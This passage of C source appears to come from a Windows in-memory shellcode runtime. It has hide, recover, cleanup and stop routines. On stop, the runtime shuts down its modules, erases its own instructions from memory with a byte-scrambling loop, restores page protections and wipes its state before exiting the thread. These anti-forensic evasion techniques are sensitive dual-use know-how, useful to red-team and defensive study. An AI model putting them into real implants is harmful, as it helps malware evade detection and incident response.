    errno errlm = RT_lock_mods();
    if (errlm != NO_ERROR)
    {
        return errlm;
    }

    errno err = hide(runtime);

    errno errum = RT_unlock_mods();
    if (errum != NO_ERROR)
    {
        return errum;
    }
    if (!rt_unlock())
    {
        return ERR_RUNTIME_UNLOCK;
    }
    return err;
}

__declspec(noinline)
errno RT_Recover()
{
    Runtime* runtime = getRuntimePointer();

    if (!rt_lock())
    {
        return ERR_RUNTIME_LOCK;
    }
    errno errlm = RT_lock_mods();
    if (errlm != NO_ERROR)
    {
        return errlm;
    }

    errno err = recover(runtime);

    errno errum = RT_unlock_mods();
    if (errum != NO_ERROR)
    {
        return errum;
    }
    if (!rt_unlock())
    {
        return ERR_RUNTIME_UNLOCK;
    }
    return err;
}

__declspec(noinline)
errno RT_GetMetrics(Runtime_Metrics* metrics)
{
    Runtime* runtime = getRuntimePointer();

    if (!rt_lock())
    {
        return ERR_RUNTIME_LOCK;
    }

    errno errno = NO_ERROR;
    if (!runtime->LibraryTracker->GetStatus(&metrics->Library))
    {
        errno = ERR_RUNTIME_GET_STATUS_LIBRARY;
    }
    if (!runtime->MemoryTracker->GetStatus(&metrics->Memory))
    {
        errno = ERR_RUNTIME_GET_STATUS_MEMORY;
    }
    if (!runtime->ThreadTracker->GetStatus(&metrics->Thread))
    {
        errno = ERR_RUNTIME_GET_STATUS_THREAD;
    }
    if (!runtime->ResourceTracker->GetStatus(&metrics->Resource))
    {
        errno = ERR_RUNTIME_GET_STATUS_RESOURCE;
    }
    if (!runtime->Sysmon->GetStatus(&metrics->Sysmon))
    {
        errno = ERR_RUNTIME_GET_STATUS_SYSMON;
    }
    if (!runtime->Watchdog->GetStatus(&metrics->Watchdog))
    {
        errno = ERR_RUNTIME_GET_STATUS_WATCHDOG;
    }

    if (!rt_unlock())
    {
        return ERR_RUNTIME_UNLOCK;
    }
    return errno;
}

__declspec(noinline)
errno RT_Cleanup()
{
    Runtime* runtime = getRuntimePointer();

    if (!rt_lock())
    {
        return ERR_RUNTIME_LOCK;
    }
    errno errlm = RT_lock_mods();
    if (errlm != NO_ERROR)
    {
        return errlm;
    }

    // maybe some libraries will use the tracked
    // memory page or heap, so free memory after
    // free all library.
    errno err = NO_ERROR;
    typedef errno (*submodule_t)();
    submodule_t submodules[] = 
    {
        // first kill all threads
        runtime->ThreadTracker->KillAll,

        // high-level modules
        runtime->WinHTTP->Clean,
        runtime->WinCrypto->Clean,

        // runtime submodules
        runtime->ResourceTracker->FreeAll,
        runtime->LibraryTracker->FreeAll,
        runtime->MemoryTracker->FreeAll,
    };
    errno enmod = NO_ERROR;
    for (int i = 0; i < arrlen(submodules); i++)
    {
        enmod = submodules[i]();
        if (enmod != NO_ERROR && err == NO_ERROR)
        {
            err = enmod;
        }
    }

    errno errum = RT_unlock_mods();
    if (errum != NO_ERROR)
    {
        return errum;
    }
    if (!rt_unlock())
    {
        return ERR_RUNTIME_UNLOCK;
    }
    return err;
}

__declspec(noinline)
errno RT_Exit()
{
    return stop(false);
}

__declspec(noinline)
void RT_Stop()
{
    stop(true);
}

__declspec(noinline)
static errno stop(bool exitThread)
{
    Runtime* runtime = getRuntimePointer();

    if (!rt_lock())
    {
        return ERR_RUNTIME_LOCK;
    }
    errno errlm = RT_lock_mods();
    if (errlm != NO_ERROR)
    {
        return errlm;
    }

    DWORD oldProtect;
    if (!adjustPageProtect(runtime, &oldProtect))
    {
        return ERR_RUNTIME_ADJUST_PROTECT;
    }

    errno error = NO_ERROR;
    // maybe some libraries will use the tracked
    // memory page or heap, so free memory after
    // free all library.
    typedef errno (*submodule_t)();
    submodule_t submodules[] = 
    {
        runtime->Watchdog->Stop,
        runtime->Sysmon->Stop,

        // kill all threads
        runtime->ThreadTracker->Clean,

        // high-level modules
        runtime->WinCrypto->Uninstall,
        runtime->WinHTTP->Uninstall,
        runtime->WinFile->Uninstall,
        runtime->WinBase->Uninstall,

        // runtime submodules
        runtime->InMemoryStorage->Clean,
        runtime->ArgumentStore->Clean,
        runtime->ResourceTracker->Clean,
        runtime->LibraryTracker->Clean,
        runtime->MemoryTracker->Clean,
    };
    errno enmod = NO_ERROR;
    for (int i = 0; i < arrlen(submodules); i++)
    {
        enmod = submodules[i]();
        if (enmod != NO_ERROR && error == NO_ERROR)
        {
            error = enmod;
        }
    }

    // must copy structure before clean runtime
    Runtime clone;
    mem_init(&clone, sizeof(Runtime));
    mem_copy(&clone, runtime, sizeof(Runtime));

    // clean runtime resource
    errno enclr = cleanRuntime(runtime);
    if (enclr != NO_ERROR && error == NO_ERROR)
    {
        error = enclr;
    }

    // store original pointer for recover instructions
    Runtime* stub = runtime;

    // must replace it until reach here
    runtime = &clone;

    // must calculate address before erase instructions
    void* init = GetFuncAddr(&InitRuntime);
    void* addr = runtime->Options.BootInstAddress;
    if (!exitThread)
    {
        addr = NULL;
    }
    if (addr == NULL || (uintptr)addr > (uintptr)init)
    {
        addr = init;
    }

    // recover instructions for generate shellcode must
    // call it after call cleanRuntime, otherwise event
    // handler will get the incorrect runtime address
    if (runtime->Options.NotEraseInstruction)
    {
        if (!recoverRuntimePointer(stub) && error == NO_ERROR)
        {
            error = ERR_RUNTIME_RECOVER_INST;
        }
    }

    // erase runtime instructions except this function
    if (!runtime->Options.NotEraseInstruction)
    {
        uintptr begin = (uintptr)(GetFuncAddr(&InitRuntime));
        uintptr end   = (uintptr)(GetFuncAddr(&RT_Exit));
        uintptr size  = end - begin;
        eraseMemory(begin, size);
        begin = (uintptr)(GetFuncAddr(&rt_epilogue));
        end   = (uintptr)(GetFuncAddr(&Argument_Stub));
        size  = end - begin;
        eraseMemory(begin, size);
    }

    // recover memory project
    // TODO move it to cleaner stub
    if (!runtime->Options.NotAdjustProtect)
    {
        uintptr begin = (uintptr)(addr);
        uintptr end   = (uintptr)(runtime->Epilogue);
        SIZE_T  size  = (SIZE_T)(end - begin);
        DWORD old;
        if (!runtime->VirtualProtect(addr, size, oldProtect, &old) && error == NO_ERROR)
        {
            error = ERR_RUNTIME_RECOVER_PROTECT;
        }
    }

    // copy function address before erase memory
    ExitThread_t ExitThread = runtime->ExitThread;

    // clean stack about cloned structure data 
    eraseMemory((uintptr)(runtime), sizeof(Runtime));

    if (exitThread)
    {
        ExitThread(0);
    }
    return error;
}

// TODO replace to xorshift
__declspec(noinline)
static void eraseMemory(uintptr address, uintptr size)
{
    byte* addr = (byte*)address;
    for (uintptr i = 0; i < size; i++)
    {
        byte b = *addr;
        if (i > 0)
        {
            byte prev = *(byte*)(address + i - 1);
            b -= prev;
            b ^= prev;
            b += prev;
            b |= prev;
        }
        b += (byte)(address + i);
        b |= (byte)(address ^ 0xFF);
        *addr = b;
        addr++;
    }
}

// prevent it be linked to other functions.
#pragma optimize("", off)

#pragma warning(push)
#pragma warning(disable: 4189)
static void rt_epilogue()
{
    byte var = 1;
    return;
}
#pragma warning(pop)

#pragma optimize("", on)
